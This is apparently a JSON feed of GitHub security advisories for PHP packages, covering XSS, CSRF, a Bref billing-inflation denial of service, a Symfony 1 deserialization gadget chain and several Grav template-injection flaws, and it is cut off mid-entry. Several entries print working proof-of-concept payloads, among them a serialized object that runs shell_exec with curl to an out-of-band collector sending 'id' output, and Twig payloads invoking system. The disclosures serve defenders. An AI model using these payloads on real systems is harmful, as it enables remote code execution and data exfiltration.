{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for PHP packages hosted at packagist.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/composer.json",
    "description": "Security Advisory for PHP packages hosted at packagist.org on GitHub",
    "items": [
        {
            "content_html": "<p>Froala Editor v4.0.1 to v4.1.1 was discovered to contain a cross-site scripting (XSS) vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-41592\">https://nvd.nist.gov/vuln/detail/CVE-2023-41592</a></li>\n<li><a href=\"https://github.com/froala/wysiwyg-editor/issues/4612#issuecomment-1729818089\">https://github.com/froala/wysiwyg-editor/issues/4612#issuecomment-1729818089</a></li>\n<li><a href=\"https://froala.com/wysiwyg-editor/changelog/#4.1.4\">https://froala.com/wysiwyg-editor/changelog/#4.1.4</a></li>\n<li><a href=\"https://hacker.soarescorp.com/cve/2023-41592\">https://hacker.soarescorp.com/cve/2023-41592</a></li>\n<li><a href=\"https://owasp.org/Top10/A03_2021-Injection\">https://owasp.org/Top10/A03_2021-Injection</a></li>\n<li><a href=\"https://owasp.org/www-project-top-ten\">https://owasp.org/www-project-top-ten</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hvpq-7vcc-5hj5\">https://github.com/advisories/GHSA-hvpq-7vcc-5hj5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hvpq-7vcc-5hj5",
            "title": "[froala/wysiwyg-editor] Froala Editor Cross-site Scripting vulnerability",
            "date_modified": "2024-03-25T13:03:11.000Z",
            "date_published": "2023-09-15T00:30:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hvpq-7vcc-5hj5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Anchor CMS v0.12.7 was discovered to contain a Cross-Site Request Forgery (CSRF) via /anchor/admin/categories/delete/2.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-29338\">https://nvd.nist.gov/vuln/detail/CVE-2024-29338</a></li>\n<li><a href=\"https://github.com/PWwwww123/cms/blob/main/1.md\">https://github.com/PWwwww123/cms/blob/main/1.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2whx-ccr7-fxqm\">https://github.com/advisories/GHSA-2whx-ccr7-fxqm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2whx-ccr7-fxqm",
            "title": "[anchorcms/anchor-cms] Cross-Site Request Forgery in Anchor CMS",
            "date_modified": "2024-03-22T20:56:58.000Z",
            "date_published": "2024-03-22T18:30:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2whx-ccr7-fxqm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The Chat activity in Moodle 4.3.3 allows students to insert a potentially unwanted HTML A element or IMG element, or HTML content that leads to a performance degradation. NOTE: the vendor's Using_Chat page says \"If you know some HTML code, you can use it in your text to do things like insert images, play sounds or create different coloured and sized text.\" This page also says \"Chat is due to be removed from standard Moodle.\"</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-28593\">https://nvd.nist.gov/vuln/detail/CVE-2024-28593</a></li>\n<li><a href=\"https://docs.moodle.org/403/en/Using_Chat\">https://docs.moodle.org/403/en/Using_Chat</a></li>\n<li><a href=\"https://gist.githubusercontent.com/minendie/4f23174687bc4d8eb7f727d9959b5399/raw/9ce573cebcce5521d9d6f826ab68f3780036b874/CVE-2024-28593.txt\">https://gist.githubusercontent.com/minendie/4f23174687bc4d8eb7f727d9959b5399/raw/9ce573cebcce5521d9d6f826ab68f3780036b874/CVE-2024-28593.txt</a></li>\n<li><a href=\"https://medium.com/%40lamscun/how-do-i-change-htmli-from-low-to-critical-your-email-box-is-safe-e7171efd88fe\">https://medium.com/%40lamscun/how-do-i-change-htmli-from-low-to-critical-your-email-box-is-safe-e7171efd88fe</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f6mh-79vh-2hv7\">https://github.com/advisories/GHSA-f6mh-79vh-2hv7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f6mh-79vh-2hv7",
            "title": "[moodle/moodle] Cross-site Scripting in Moodle Chat",
            "date_modified": "2024-03-22T20:44:46.000Z",
            "date_published": "2024-03-22T15:31:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f6mh-79vh-2hv7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Anchor CMS v0.12.7 was discovered to contain a Cross-Site Request Forgery (CSRF) via /anchor/admin/users/delete/2.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-29499\">https://nvd.nist.gov/vuln/detail/CVE-2024-29499</a></li>\n<li><a href=\"https://github.com/daddywolf/cms/blob/main/1.md\">https://github.com/daddywolf/cms/blob/main/1.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4xw8-9fj7-j58j\">https://github.com/advisories/GHSA-4xw8-9fj7-j58j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4xw8-9fj7-j58j",
            "title": "[anchorcms/anchor-cms] Cross-Site Request Forgery in Anchor CMS",
            "date_modified": "2024-03-22T20:41:54.000Z",
            "date_published": "2024-03-22T18:30:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4xw8-9fj7-j58j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"impacted-resources\">Impacted Resources</h2>\n<p>bref/src/Event/Http/Psr7Bridge.php:94-125\nmultipart-parser/src/StreamedPart.php:383-418</p>\n<h2 id=\"description\">Description</h2>\n<p>When Bref is used with the Event-Driven Function runtime and the handler is a <code>RequestHandlerInterface</code>, then the Lambda event is converted to a PSR7 object.\nDuring the conversion process, if the request is a MultiPart, each part is parsed. In the parsing process, the <code>Content-Type</code> header of each part is read using the <a href=\"https://github.com/Riverline/multipart-parser/\"><code>Riverline/multipart-parser</code></a> library.</p>\n<p>The library, in the <code>StreamedPart::parseHeaderContent</code> function, performs slow multi-byte string operations on the header value.\nPrecisely, the <a href=\"https://www.php.net/manual/en/function.mb-convert-encoding.php\"><code>mb_convert_encoding</code></a> function is used with the first (<code>$string</code>) and third (<code>$from_encoding</code>) parameters read from the header value.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>An attacker could send specifically crafted requests which would force the server into performing long operations with a consequent long billed duration.</p>\n<p>The attack has the following requirements and limitations:</p>\n<ul>\n<li>The Lambda should use the Event-Driven Function runtime.</li>\n<li>The Lambda should use the <code>RequestHandlerInterface</code> handler.</li>\n<li>The Lambda should implement at least an endpoint accepting POST requests.</li>\n<li>The attacker can send requests up to 6MB long (this is enough to cause a billed duration between 400ms and 500ms with the default 1024MB RAM Lambda image of Bref).</li>\n<li>If the Lambda uses a PHP runtime &lt;= php-82 the impact is higher as the billed duration in the default 1024MB RAM Lambda image of Bref could be brought to more than 900ms for each request.</li>\n</ul>\n<p>Notice that the vulnerability applies only to headers read from the request body as the request header has a limitation which allows a total maximum size of ~10KB.</p>\n<h2 id=\"poc\">PoC</h2>\n<ol>\n<li>Create a new Bref project.</li>\n<li>Create an <code>index.php</code> file with the following content:</li>\n</ol>\n<pre><code class=\"language-php\">&lt;?php\n\nnamespace App;\n\nrequire __DIR__ . '/vendor/autoload.php';\n\nuse Nyholm\\Psr7\\Response;\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface;\nuse Psr\\Http\\Server\\RequestHandlerInterface;\n\nclass MyHttpHandler implements RequestHandlerInterface\n{\n    public function handle(ServerRequestInterface $request): ResponseInterface\n    {\n        return new Response(200, [], \"OK\");\n    }\n}\n\nreturn new MyHttpHandler();\n</code></pre>\n<ol start=\"3\">\n<li>Use the following <code>serverless.yml</code> to deploy the Lambda:</li>\n</ol>\n<pre><code class=\"language-yaml\">service: app\n\nprovider:\n    name: aws\n    region: eu-central-1\n\nplugins:\n    - ./vendor/bref/bref\n\n# Exclude files from deployment\npackage:\n    patterns:\n        - '!node_modules/**'\n        - '!tests/**'\n\nfunctions:\n    api:\n        handler: index.php\n        runtime: php-83\n        events:\n            - httpApi: 'ANY /endpoint'\n</code></pre>\n<ol start=\"4\">\n<li>Run the following python script with as first argument the domain assigned to the Lambda (e.g. <code>python3 poc.py a10avtqg5c.execute-api.eu-central-1.amazonaws.com</code>):</li>\n</ol>\n<pre><code class=\"language-python\">from requests import post\nfrom sys import argv\n\nif len(argv) != 2:\n    print(f\"Usage: {argv[0]} &lt;domain&gt;\")\n    exit()\n\nurl = f\"https://{argv[1]}/endpoint\"\nheaders = {\"Content-Type\": \"multipart/form-data; boundary=a\"}\ndata_normal = f\"--a\\r\\nContent-Disposition: form-data; name=\\\"0\\\"\\r\\n\\r\\nContent-Type: ;*=auto''{('a'*(4717792))}'\\r\\n--a--\\r\\n\"\ndata_malicious = f\"--a\\r\\nContent-Disposition: form-data; name=\\\"0\\\"\\r\\nContent-Type: ;*=auto''{('a'*(4717792))}'\\r\\n\\r\\n\\r\\n--a--\\r\\n\"\n\nprint(\"[+] Sending normal request\")\npost(url, headers=headers, data=data_normal)\n\nprint(\"[+] Sending malicious request\")\npost(url, headers=headers, data=data_malicious)\n</code></pre>\n<ol start=\"5\">\n<li>Observe the CloudWatch logs of the Lambda and notice that the first requests used less than 200ms of billed duration, while the second one, which has a malicious <code>Content-Type</code> header, used more than 400ms of billed duration.</li>\n</ol>\n<h2 id=\"suggested-remediation\">Suggested Remediation</h2>\n<p>Perform an additional validation on the headers parsed via the <code>StreamedPart::parseHeaderContent</code> function to allow only legitimate headers with a reasonable length.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/brefphp/bref/security/advisories/GHSA-j4hq-f63x-f39r\">https://github.com/brefphp/bref/security/advisories/GHSA-j4hq-f63x-f39r</a></li>\n<li><a href=\"https://github.com/brefphp/bref/commit/5f7c0294628dbcec6305f638ff7e2dba8a1c2f45\">https://github.com/brefphp/bref/commit/5f7c0294628dbcec6305f638ff7e2dba8a1c2f45</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-29186\">https://nvd.nist.gov/vuln/detail/CVE-2024-29186</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j4hq-f63x-f39r\">https://github.com/advisories/GHSA-j4hq-f63x-f39r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j4hq-f63x-f39r",
            "title": "[bref/bref] Slow String Operations via MultiPart Requests in Event-Driven Functions",
            "date_modified": "2024-03-22T20:02:20.000Z",
            "date_published": "2024-03-22T16:57:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j4hq-f63x-f39r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Symfony 1 has a gadget chain due to dangerous unserialize in <code>sfNamespacedParameterHolder</code> class that would enable an attacker to get remote code execution if a developer unserialize user input in his project.</p>\n<h3 id=\"details\">Details</h3>\n<p>This vulnerability present no direct threat but is a vector that will enable remote code execution if a developper deserialize user untrusted data. For example:</p>\n<pre><code class=\"language-php\"> public function executeIndex(sfWebRequest $request)\n  {\n    $a = unserialize($request-&gt;getParameter('user'));\n  }\n</code></pre>\n<p>We will make the assumption this is the case in the rest of this explanation.</p>\n<p>Symfony 1 provides the class <code>sfNamespacedParameterHolder</code> which implements <code>Serializable</code> interface. In particular, when an instance of this class is deserialized, the normal php behavior is hooked by implementing <code>unserialize()</code> method:</p>\n<pre><code class=\"language-php\">    public function unserialize($serialized)\n    {\n        $this-&gt;__unserialize(unserialize($serialized));\n    }\n</code></pre>\n<p>Which make an array access on the deserialized data without control on the type of the <code>$data</code> parameter:</p>\n<pre><code class=\"language-php\">    public function __unserialize($data)\n    {\n        $this-&gt;default_namespace = $data[0];\n        $this-&gt;parameters = $data[1];\n    }\n</code></pre>\n<p>Thus, an attacker provide any object type in <code>$data</code> to make PHP access to another array/object properties than intended by the developer. In particular, it is possible to abuse the array access which is triggered on <code>$data[0]</code> for any class implementing <code>ArrayAccess</code>  interface. <code>sfOutputEscaperArrayDecorator</code>  implements such interface. Here is the call made on <code>offsetGet()</code>:</p>\n<pre><code class=\"language-php\">  public function offsetGet($offset)\n    {\n        $value = isset($this-&gt;value[$offset]) ? $this-&gt;value[$offset] : null;\n\n        return sfOutputEscaper::escape($this-&gt;escapingMethod, $value);\n    }\n</code></pre>\n<p>Which trigger <code>escape()</code> in <code>sfOutputEscaper</code> class with attacker controlled parameters from deserialized object with <code>$this-&gt;escapingMethod</code> and <code>$this-&gt;value[$offset]</code>:</p>\n<pre><code class=\"language-php\">  public static function escape($escapingMethod, $value)\n  {\n    if (null === $value)\n    {\n      return $value;\n    }\n\n    // Scalars are anything other than arrays, objects and resources.\n    if (is_scalar($value))\n    {\n      return call_user_func($escapingMethod, $value);\n    }\n</code></pre>\n<p>Which calls <code>call_user_func</code> with previous attacker controlled input.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>So we need the following object to trigger an OS command like <code>shell_exec(\"curl https://7v3fcazcqt9v0dowwmef4aph48azyqtei.oastify.com?a=$(id)\");</code>:</p>\n<pre><code class=\"language-php\">object(sfNamespacedParameterHolder)#4 (1) {\n  [\"prop\":protected]=&gt;\n  object(sfOutputEscaperArrayDecorator)#3 (2) {\n    [\"value\":protected]=&gt;\n    array(1) {\n      [0]=&gt;\n      string(66) \"curl https://7v3fcazcqt9v0dowwmef4aph48azyqtei.oastify.com?a=$(id)\"\n    }\n    [\"escapingMethod\":protected]=&gt;\n    string(10) \"shell_exec\"\n  }\n}\n</code></pre>\n<p>We craft a chain with PHPGGC. Please do not publish it as I will make a PR on PHPGGC but I wait for you to fix before:</p>\n<ul>\n<li>gadgets.php:</li>\n</ul>\n<pre><code class=\"language-php\">class sfOutputEscaperArrayDecorator\n{\n  protected $value;\n\n  protected $escapingMethod;\n\n  public function __construct($escapingMethod, $value) {\n    $this-&gt;escapingMethod = $escapingMethod;\n    $this-&gt;value = $value;\n  }\n}\n\nclass sfNamespacedParameterHolder implements Serializable \n{\n    protected $prop = null;\n\n    public function __construct($prop) {\n      $this-&gt;prop = $prop;\n    }\n\n    public function serialize()\n    {\n        return serialize($this-&gt;prop);\n    }\n\n    public function unserialize($serialized)\n    {\n        \n    }\n}\n</code></pre>\n<ul>\n<li>chain.php:</li>\n</ul>\n<pre><code class=\"language-php\">namespace GadgetChain\\Symfony;\n\nclass RCE16 extends \\PHPGGC\\GadgetChain\\RCE\\FunctionCall\n{\n    public static $version = '1.1.0 &lt;= 1.5.18';\n    public static $vector = 'Serializable';\n    public static $author = 'darkpills';\n    public static $information = '';\n\n    public function generate(array $parameters)\n    {\n        $escaper = new \\sfOutputEscaperArrayDecorator($parameters['function'], array($parameters['parameter']));\n\n        $tableInfo = new \\sfNamespacedParameterHolder($escaper);\n        \n        return $tableInfo;\n    }\n}\n</code></pre>\n<p>And trigger the deserialization with an HTTP request like the following on a dummy test controller:</p>\n<pre><code class=\"language-http\">POST /frontend_dev.php/test/index HTTP/1.1\nHost: localhost:8001\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 532\n\nuser=C%3A27%3A%22sfNamespacedParameterHolder%22%3A183%3A%7BO%3A29%3A%22sfOutputEscaperArrayDecorator%22%3A2%3A%7Bs%3A8%3A%22%00%2A%00value%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A66%3A%22curl+https%3A%2F%2F7v3fcazcqt9v0dowwmef4aph48azyqtei.oastify.com%3Fa%3D%24%28id%29%22%3B%7Ds%3A17%3A%22%00%2A%00escapingMethod%22%3Bs%3A10%3A%22shell_exec%22%3B%7D%7D\n</code></pre>\n<p>Note that CVSS score is not applicable to this kind of vulnerability.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>The attacker can execute any PHP command which leads to remote code execution.</p>\n<h3 id=\"recommendation\">Recommendation</h3>\n<p>I recommend to add a type checking before doing any processing on the unserialized input like this example:</p>\n<pre><code class=\"language-php\">public function unserialize($data)\n{\n    if (is_array($data)) {\n      $this-&gt;default_namespace = $data[0];\n      $this-&gt;parameters = $data[1];\n    } else {\n      $this-&gt;default_namespace = null;\n      $this-&gt;parameters = array();\n\n      // or throw an exception maybe?\n    }\n}\n</code></pre>\n<p>This fix should be applied in both <code>sfNamespacedParameterHolder</code> and <code>sfParameterHolder</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/FriendsOfSymfony1/symfony1/security/advisories/GHSA-pv9j-c53q-h433\">https://github.com/FriendsOfSymfony1/symfony1/security/advisories/GHSA-pv9j-c53q-h433</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pv9j-c53q-h433\">https://github.com/advisories/GHSA-pv9j-c53q-h433</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pv9j-c53q-h433",
            "title": "[friendsofsymfony1/symfony1]  Gadget chain in Symfony 1 due to uncontrolled unserialized input in sfNamespacedParameterHolder",
            "date_modified": "2024-03-22T16:56:22.000Z",
            "date_published": "2024-03-22T16:56:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pv9j-c53q-h433"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Due to the unrestricted access to twig extension class from grav context, an attacker can redefine the escape function and execute arbitrary commands.</p>\n<h3 id=\"details\">Details</h3>\n<p><a href=\"https://github.com/twigphp/Twig/blob/3.x/src/Extension/EscaperExtension.php#L99\">https://github.com/twigphp/Twig/blob/3.x/src/Extension/EscaperExtension.php#L99</a></p>\n<pre><code class=\"language-php\">/**\n     * Defines a new escaper to be used via the escape filter.\n     *\n     * @param string   $strategy The strategy name that should be used as a strategy in the escape call\n     * @param callable $callable A valid PHP callable\n     */\n    public function setEscaper($strategy, callable $callable)\n    {\n        $this-&gt;escapers[$strategy] = $callable;\n    }\n</code></pre>\n<p> Twig supports the functionality to redefine the escape function through the setEscaper method. \nHowever, that method is not originally exposed to the twig environment, but it is accessible through the payload below.</p>\n<pre><code class=\"language-plaintext\">{{ grav.twig.twig.extensions.core.setEscaper('a','a') }}\n</code></pre>\n<p>At this point, it accepts callable type as an argument, but as there is no validation for the $callable variable, attackers can set dangerous functions like system as the escaper function.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code>{{ var_dump(grav.twig.twig.extensions.core.setEscaper('system','twig_array_filter')) }}\n{{ var_dump(['id'] | escape('system', 'system')) }}\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Twig processing of static pages can be enabled in the front matter by any administrative user allowed to create or edit pages.\nAs the Twig processor runs unsandboxed, this behavior can be used to gain arbitrary code execution and elevate privileges on the instance.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getgrav/grav/security/advisories/GHSA-2m7x-c7px-hp58\">https://github.com/getgrav/grav/security/advisories/GHSA-2m7x-c7px-hp58</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-28119\">https://nvd.nist.gov/vuln/detail/CVE-2024-28119</a></li>\n<li><a href=\"https://github.com/getgrav/grav/commit/de1ccfa12dbcbf526104d68c1a6bc202a98698fe\">https://github.com/getgrav/grav/commit/de1ccfa12dbcbf526104d68c1a6bc202a98698fe</a></li>\n<li><a href=\"https://github.com/twigphp/Twig/blob/3.x/src/Extension/EscaperExtension.php#L99\">https://github.com/twigphp/Twig/blob/3.x/src/Extension/EscaperExtension.php#L99</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2m7x-c7px-hp58\">https://github.com/advisories/GHSA-2m7x-c7px-hp58</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2m7x-c7px-hp58",
            "title": "[getgrav/grav] Server Side Template Injection (SSTI) via Twig escape handler",
            "date_modified": "2024-03-22T16:56:06.000Z",
            "date_published": "2024-03-22T16:56:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2m7x-c7px-hp58"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Due to the unrestricted access to twig extension class from grav context, an attacker can redefine config variable. As a result, attacker can bypass previous patch.</p>\n<h3 id=\"details\">Details</h3>\n<p>The twig context has a function declared called getFunction.</p>\n<pre><code class=\"language-php\">public function getFunction($name)\n    {\n        if (!$this-&gt;extensionInitialized) {\n            $this-&gt;initExtensions();\n        }\n\n        if (isset($this-&gt;functions[$name])) {\n            return $this-&gt;functions[$name];\n        }\n\n        foreach ($this-&gt;functions as $pattern =&gt; $function) {\n            $pattern = str_replace('\\\\*', '(.*?)', preg_quote($pattern, '#'), $count);\n\n            if ($count) {\n                if (preg_match('#^'.$pattern.'$#', $name, $matches)) {\n                    array_shift($matches);\n                    $function-&gt;setArguments($matches);\n\n                    return $function;\n                }\n            }\n        }\n\n        foreach ($this-&gt;functionCallbacks as $callback) {\n            if (false !== $function = \\call_user_func($callback, $name)) {\n                return $function;\n            }\n        }\n\n        return false;\n    }\n</code></pre>\n<p>This function, if the value of <code>$name</code> does not exist in <code>$this-&gt;functions</code>, uses call_user_func to execute callback functions stored in <code>$this-&gt;functionCallbacks</code>.</p>\n<p>It is possible to register arbitrary function using registerUndefinedFunctionCallback, but a callback that has already been registered exists and new callbacks added will not be executed.</p>\n<p>The default function callback is as follows:</p>\n<pre><code class=\"language-php\">$this-&gt;twig-&gt;registerUndefinedFunctionCallback(function (string $name) use ($config) {\n                $allowed = $config-&gt;get('system.twig.safe_functions');\n                if (is_array($allowed) and in_array($name, $allowed, true) and function_exists($name)) {\n                    return new TwigFunction($name, $name);\n                }\n                if ($config-&gt;get('system.twig.undefined_functions')) {\n                    if (function_exists($name)) {\n                        if (!Utils::isDangerousFunction($name)) {\n                            user_error(\"PHP function {$name}() was used as Twig function. This is deprecated in Grav 1.7. Please add it to system configuration: `system.twig.safe_functions`\", E_USER_DEPRECATED);\n\n                            return new TwigFunction($name, $name);\n                        }\n\n                        /** @var Debugger $debugger */\n                        $debugger = $this-&gt;grav['debugger'];\n                        $debugger-&gt;addException(new RuntimeException(\"Blocked potentially dangerous PHP function {$name}() being used as Twig function. If you really want to use it, please add it to system configuration: `system.twig.safe_functions`\"));\n                    }\n\n                    return new TwigFunction($name, static function () {});\n                }\n\n                return false;\n            });\n</code></pre>\n<p>If you look at this function, if the value of system.twig.undefined_functions is false, it returns false.\nIn that case, it is possible for our registered callback to be executed.</p>\n<p>At this time, the <code>Grav\\Common\\Config\\Config</code> class is loaded within the grav context, and access to the set method is allowed, making it possible to set the value of system.twig.undefined_functions to false.\nAs a result, an attacker can execute any arbitrarily registered callback function.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code>{{ grav.twig.twig.registerUndefinedFunctionCallback('system') }}\n{% set a = grav.config.set('system.twig.undefined_functions',false) %}\n{{ grav.twig.twig.getFunction('id') }}\n</code></pre>\n<p><img alt=\"image\" src=\"https://user-images.githubusercontent.com/46442697/281371295-25174479-e9ab-40ca-8016-99c51f72d7a8.png\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>Twig processing of static pages can be enabled in the front matter by any administrative user allowed to create or edit pages.\nAs the Twig processor runs unsandboxed, this behavior can be used to gain arbitrary code execution and elevate privileges on the instance.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getgrav/grav/security/advisories/GHSA-r6vw-8v8r-pmp4\">https://github.com/getgrav/grav/security/advisories/GHSA-r6vw-8v8r-pmp4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-28118\">https://nvd.nist.gov/vuln/detail/CVE-2024-28118</a></li>\n<li><a href=\"https://github.com/getgrav/grav/commit/de1ccfa12dbcbf526104d68c1a6bc202a98698fe\">https://github.com/getgrav/grav/commit/de1ccfa12dbcbf526104d68c1a6bc202a98698fe</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r6vw-8v8r-pmp4\">https://github.com/advisories/GHSA-r6vw-8v8r-pmp4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r6vw-8v8r-pmp4",
            "title": "[getgrav/grav] Server Side Template Injection (SSTI)",
            "date_modified": "2024-03-22T16:55:41.000Z",
            "date_published": "2024-03-22T16:55:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r6vw-8v8r-pmp4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Grav validates accessible functions through the Utils::isDangerousFunction function, but does not impose restrictions on twig functions like twig_array_map, allowing attackers to bypass the validation and execute arbitrary commands.</p>\n<h3 id=\"details\">Details</h3>\n<pre><code>{{ grav.twig.twig.getFunction('twig_array_map')|var_dump }}\n</code></pre>\n<p><img alt=\"image\" src=\"https://user-images.githubusercontent.com/46442697/281397674-6098806a-e936-4849-956e-d394a7c037da.png\"></p>\n<p>When we accessed twig_array_map like this, we confirmed that the twigFunction object is properly returned. Since the callable property is correctly included, we can access twig_array_map without any restrictions.</p>\n<pre><code>{% set cmd = {'id':'system'} %}\n{{ twig_array_map(grav.twig.twig,cmd,'call_user_func')|join }}\n</code></pre>\n<p>Since there is no validation on twig_array_map itself, it is possible to call arbitrary function using call_user_func.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code>{% set cmd = {'id':'system'} %}\n{{ twig_array_map(grav.twig.twig,cmd,'call_user_func')|join }}\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Twig processing of static pages can be enabled in the front matter by any administrative user allowed to create or edit pages.\nAs the Twig processor runs unsandboxed, this behavior can be used to gain arbitrary code execution and elevate privileges on the instance.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getgrav/grav/security/advisories/GHSA-qfv4-q44r-g7rv\">https://github.com/getgrav/grav/security/advisories/GHSA-qfv4-q44r-g7rv</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-28117\">https://nvd.nist.gov/vuln/detail/CVE-2024-28117</a></li>\n<li><a href=\"https://github.com/getgrav/grav/commit/de1ccfa12dbcbf526104d68c1a6bc202a98698fe\">https://github.com/getgrav/grav/commit/de1ccfa12dbcbf526104d68c1a6bc202a98698fe</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qfv4-q44r-g7rv\">https://github.com/advisories/GHSA-qfv4-q44r-g7rv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qfv4-q44r-g7rv",
            "title": "[getgrav/grav] Server Side Template Injection (SSTI)",
            "date_modified": "2024-03-22T16:35:51.000Z",
            "date_published": "2024-03-22T16:35:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qfv4-q44r-g7rv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Grav CMS is vulnerable to a Server-Side Template Injection (SSTI), which allows any authenticated user (editor permissions are sufficient) to execute arbitrary code on the remote server bypassing the existing security sandbox.</p>\n<h3 id=\"details\">Details</h3>\n<p>The Grav CMS implements a custom sandbox to protect the powerful Twig methods \"registerUndefinedFunctionCallback()\" and \"registerUndefinedFilterCallback()\", in order to avoid SSTI attacks by denying the calling of dangerous PHP functions into the Twig template directives (such as: \"exec()\", \"passthru()\", \"system()\", etc.). \nThe current defenses are based on a blacklist of prohibited functions (PHP, Twig), checked through the \"isDangerousFunction()\" method called in the file \"system/src/Grav/Common/Twig.php\":</p>\n<pre><code class=\"language-php\">...\n$this-&gt;twig = new TwigEnvironment($loader_chain, $params);\n\n$this-&gt;twig-&gt;registerUndefinedFunctionCallback(function (string $name) use ($config) {\n    $allowed = $config-&gt;get('system.twig.safe_functions');\n    if (is_array($allowed) &amp;&amp; in_array($name, $allowed, true) &amp;&amp; function_exists($name)) {\n        return new TwigFunction($name, $name);\n    }\n    if ($config-&gt;get('system.twig.undefined_functions')) {\n        if (function_exists($name)) {\n            if (!Utils::isDangerousFunction($name)) {\n                user_error(\"PHP function {$name}() was used as Twig function. This is deprecated in Grav 1.7. Please add it to system configuration: `system.twig.safe_functions`\", E_USER_DEPRECATED);\n\n                return new TwigFunction($name, $name);\n            }\n\n           /** @var Debugger $debugger */\n           $debugger = $this-&gt;grav['debugger'];\n           $debugger-&gt;addException(new RuntimeException(\"Blocked potentially dangerous PHP function {$name}() being used as Twig function. If you really want to use it, please add it to system configuration: `system.twig.safe_functions`\"));\n        }\n\n        return new TwigFunction($name, static function () {});\n    }\n\n    return false;\n});\n\n$this-&gt;twig-&gt;registerUndefinedFilterCallback(function (string $name) use ($config) {\n    $allowed = $config-&gt;get('system.twig.safe_filters');\n    if (is_array($allowed) &amp;&amp; in_array($name, $allowed, true) &amp;&amp; function_exists($name)) {\n        return new TwigFilter($name, $name);\n    }\n    if ($config-&gt;get('system.twig.undefined_filters')) {\n        if (function_exists($name)) {\n            if (!Utils::isDangerousFunction($name)) {\n                user_error(\"PHP function {$name}() used as Twig filter. This is deprecated in Grav 1.7. Please add it to system 